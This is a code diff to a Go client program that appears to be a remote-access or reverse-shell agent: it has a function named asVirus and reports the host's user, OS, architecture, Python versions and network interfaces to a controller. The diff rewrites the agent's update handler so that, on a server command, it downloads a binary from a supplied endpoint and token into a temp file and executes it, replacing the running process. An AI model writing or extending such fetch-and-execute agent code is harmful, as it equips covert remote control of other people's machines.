@@ -277,6 +277,7 @@ func handleConnection(c *client) {
 					Version:           update.Version,
 					User:              username,
 					OS:                runtime.GOOS,
+					Arch:              runtime.GOARCH,
 					Python2:           python2,
 					Python3:           python3,
 					NetworkInterfaces: interfaces,
@@ -672,16 +673,16 @@ func handleConnection(c *client) {
 		case message.UPDATE:
 			file, _ := ioutil.TempFile(os.TempDir(), "temp")
 			exe := file.Name()
-			log.Info("New filename: %s", exe)
-			DistributorURL := msg.Body.(*message.BodyUpdate).DistributorURL
+			token := msg.Body.(*message.BodyUpdate).Token
+			endpoint := msg.Body.(*message.BodyUpdate).Endpoint
 			version := msg.Body.(*message.BodyUpdate).Version
-			log.Info("New version v%s is available, upgrading...", version)
-			url := fmt.Sprintf("%s/termite/%s", DistributorURL, c.Service)
+			url := fmt.Sprintf("%s/%s", endpoint, token)
+			log.Info("Upgrading from v%s to v%s", update.Version, version)
+			log.Info("Downloading %s into %s", url, exe)
 			if err := selfupdate.UpdateTo(url, exe); err != nil {
 				log.Error("Error occurred while updating binary: %s", err)
 				return
 			}
-			log.Info("Update to v%s finished", version)
 			log.Info("Restarting...")
 			syscall.Exec(exe, []string{exe}, nil)
 		}
@@ -788,7 +789,7 @@ func asVirus() {
 }
 
 func main() {
-	release := true
+	release := false
 	service := "127.0.0.1:13337"
 	/*
 		Each element of a domain name separated by [.] is called a “label.”
